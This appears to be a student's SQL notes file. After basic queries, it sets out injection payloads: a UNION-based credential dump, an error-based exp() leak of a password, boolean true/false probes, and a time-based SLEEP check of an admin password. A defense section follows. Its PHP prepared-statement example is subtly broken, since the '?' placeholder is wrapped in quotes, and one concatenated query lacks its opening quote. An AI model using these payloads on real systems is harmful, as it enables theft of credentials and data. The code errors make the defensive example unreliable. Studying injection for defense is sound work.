/* Basic Selection from table */
SELECT customer
FROM orders;
/* Adding entries into tables */
INSERT INTO items (item_id, price, description_)
VALUES (101, 53.25, "A new Pair of Shoes");
/* Updating a certain variable in a 'items' table */
UPDATE items
SET price = 65.93
WHERE item_id = 101;
/* UNION-BASED INJECTIONS:
 --------------------------------
 
 ~ Allows us to take seperate SELECT queries and combine their results
 
 IMAGINE: 
 SQL SEARCH QUERY IS
 */
USER_INPUT = "soap' UNION SELECT username,password,NULL FROM user_table;-- -";
query = "SELECT product_name, product_cost, product_description FROM product_table WHERE product_name = " + USER_INPUT + "';";
/* Error-BASED INJECTIONS:
 --------------------------------
 
 ~ Allows us to force the application to return an error message with sensative data
 
 IMAGINE: 
 SQL SEARCH QUERY IS
 */
MALPUT = "asdf' UNION select 1, exp(~(select*from(SELECT Password FROM profiles WHERE ID=1)x)); -- -"
/* Boolean-BASED INJECTIONS:
 --------------------------------
 
 ~ Allows us to confirm true or false questions about the database
 
 IMAGINE: 
 SQL SEARCH QUERY IS
 
 */
SELECT username,
    email
FROM users
WHERE id = '[USER INPUT]';
/* And you inputed this 
 
 WHY USE THIS :
 Boolean injections are often used to figure 
 out the name of a database table (possibly to build up for a Union-based injection),
 manipulating one query at a time to confirm one character at a time
 
 */
INPUT_1 = "1' AND '1' = '2";
INPUT_2 = "1' AND '1' = '1";
/* TIME-BASED INJECTIONS:
 --------------------------------
 
 ~ Allows us to  confirm sensitive information 
 IMAGINE: 
 SQL SEARCH QUERY IS
 */
SELECT id
FROM users
WHERE username = 'USER';
input = "a' OR IF((SELECT password FROM users WHERE username='admin')='P@ssw0rd123', SLEEP(5), NULL);-- -";
/* Giving us the Query To confirm a Admin's Password */
SELECT id
FROM users
WHERE username = 'a'
    OR IF(
        (
            SELECT password
            FROM users
            WHERE username = 'admin'
        ) = 'P@ssw0rd123',
        SLEEP(5),
        NULL
    );
-- -';
/* Out-of-Band SQL INJECTIONS:
 --------------------------------
 
 ~ Generally, these SQL injections will cause the database server to send HTTP or DNS requests containing SQL query results to an attacker-controlled server. From there, the attacker could review the log files to identify the query results.
 
 Again, these injections are extremely difficult to execute. They rely on permissions to database functions that are most often disabled, and would have to bypass firewalls that might stop requests to the attacker’s server.
 
 IMAGINE: 
 SQL SEARCH QUERY IS
 */
/* DEFENDING AGAINST SQL INJECTIONS
 __________________________________________
 
 Sanitation: 
 ~ remove dangerous charecters from input script 
 ['] 
 [;]
 [\--]
 
 ~ Prepared Satements - Treat all inputs as params and not executable code
 
 i.e > For a PHP web-application on the backend 
 */
$username = $_GET ['user'];
$stmt = $conn->prepare("SELECT * FROM Users WHERE name = '?'");
$stmt->bind_param("s", $username);
$stmt->execute();